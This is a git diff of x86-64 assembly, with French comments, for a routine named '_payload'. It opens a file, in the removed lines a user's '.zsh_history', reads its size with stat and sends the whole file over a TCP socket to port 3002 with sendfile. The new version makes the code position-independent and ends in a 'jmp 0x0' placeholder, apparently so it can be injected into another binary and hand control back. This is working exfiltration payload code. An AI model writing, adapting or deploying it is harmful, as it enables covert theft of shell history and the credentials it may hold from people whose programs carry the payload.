@@ -17,22 +17,6 @@ global _payload_size
 %endrep
 %endmacro
 
-section .data
-    path db '/home/maxence/.zsh_history', 0
-    stat_buffer times 144 db 0  ; Taille de struct stat sur x86-64
-    sockaddr_in:
-        ; La structure sockaddr_in est composée de :
-        ; - sin_family: 2 octets
-        ; - sin_port: 2 octets
-        ; - sin_addr: 4 octets
-        ; - sin_zero: 8 octets
-        ; Taille totale: 16 octets
-        ; Nous définissons la structure en mémoire ici.
-        dw 2                       ; sin_family (AF_INET)
-        dw 0xba0b                  ; sin_port (3002 en hex)
-        dd 0                       ; sin_addr (INADDR_ANY)
-        times 8 db 0               ; sin_zero (8 octets de zéros)
-
 section .text
 global _payload
 
@@ -41,46 +25,43 @@ _payload:
     mov rbp, rsp
 
     ; Ouvrir le fichier
-    mov rax, 2 ; SYS_open
-    lea rdi, [path]
-    mov rsi, 0 ; O_RDONLY
+    mov rax, 2			; SYS_open
+    lea rdi, [rel path]		; Chemin du fichier
+    mov rsi, 0			; O_RDONLY
     syscall
-	mov r10, rax
     test rax, rax
-    js error_open
+    js exit				; Gestion de l'erreur
 
     mov r12, rax ; Descripteur de fichier
 
     ; Récupérer les métadonnées du fichier
-    mov rax, 4 ; SYS_stat
-    lea rdi, [path]
-    lea rsi, [stat_buffer]
+    mov rax, 4				; SYS_stat
+    lea rdi, [rel path]			; Chemin du fichier
+    lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
     syscall
-	mov r10, rax
     test rax, rax
-    js error_stat
+    js error_open			; Gestion de l'erreur
 
     ; Créer la socket
-    mov rax, 41 ; SYS_socket
-    mov rdi, 2 ; AF_INET
-    mov rsi, 1 ; SOCK_STREAM
+    mov rax, 41				; SYS_socket
+    mov rdi, 2				; AF_INET
+    mov rsi, 1				; SOCK_STREAM
     mov rdx, 0
     syscall
-	mov r10, rax
     test rax, rax
-    js error_socket
+    js error_open			; Gestion de l'erreur
 
+	; Sauvegarder le descripteur de socket
     mov r13, rax ; Descripteur de socket
 
     ; Connecter au serveur
-    mov rax, 42 ; SYS_connect
-    mov rdi, r13
-    lea rsi, [sockaddr_in]
-    mov rdx, 16 ; Taille de sockaddr_in
+    mov rax, 42				; SYS_connect
+    mov rdi, r13			; Descripteur de socket
+    lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
+    mov rdx, 16				; Taille de sockaddr_in
     syscall
-	mov r10, rax
     test rax, rax
-    js error_connect
+    js error_socket			; Gestion de l'erreur
 
 	; Send the file
 	mov rax, 40						; SYS_sendfile
@@ -89,43 +70,39 @@ _payload:
 	xor rdx, rdx					; offset (NULL)
 	mov r10, [rel stat_buffer + 48]	; size
 	syscall
+    test rax, rax
+    js error_socket					; Gestion de l'erreur
 
-    ; Fermer le fichier et la socket
-    mov rax, 3 ; SYS_close
-    mov rdi, r12
-    syscall
+error_socket:
+    ; Gestion de l'erreur
+	; Fermer la socket
     mov rax, 3 ; SYS_close
     mov rdi, r13
     syscall
-	mov r10, rax
-
     jmp exit
 
 error_open:
     ; Gestion de l'erreur
-    ; ...
-    jmp exit
-
-error_stat:
-    ; Gestion de l'erreur
-    ; ...
-    jmp exit
-
-error_socket:
-    ; Gestion de l'erreur
-    ; ...
-    jmp exit
-
-error_connect:
-    ; Gestion de l'erreur
-    ; ...
+	; Fermer le fichier
+    mov rax, 3 ; SYS_close
+    mov rdi, r12
+	syscall
     jmp exit
 
 exit:
-    ; Quitter le programme
-    ; mov rax, 60
-    ; xor rdi, rdi
-    ; syscall
-	mov rax, r10
-	leave
-    ret
+    ; Jump to the next instruction
+	jmp 0x0
+
+section .text
+stat_buffer	times 144 db 0	; Taille de struct stat sur x86-64
+path		times 1024 db 0	; Chemin du fichier
+sockaddr_in:
+	; - sin_family: 2 octets
+	; - sin_port: 2 octets
+	; - sin_addr: 4 octets
+	; - sin_zero: 8 octets
+	dw 2                       ; sin_family (AF_INET)
+	dw 0xba0b                  ; sin_port (3002 en hex)
+	dd 0                       ; sin_addr (INADDR_ANY)
+	times 8 db 0               ; sin_zero (8 octets de zéros)
+	; Taille totale: 16 octets
